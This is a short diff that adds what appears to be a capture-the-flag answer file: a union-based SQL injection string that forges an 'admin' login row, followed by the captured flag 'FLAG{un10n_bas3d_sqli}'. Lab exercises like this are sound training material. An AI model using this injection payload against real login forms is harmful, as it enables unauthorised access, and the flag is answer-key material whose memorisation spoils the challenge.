@@ -1,0 +1,5 @@
+1. 
+xxx') union SELECT 'admin', 'test' --
+
+2.
+FLAG{un10n_bas3d_sqli}
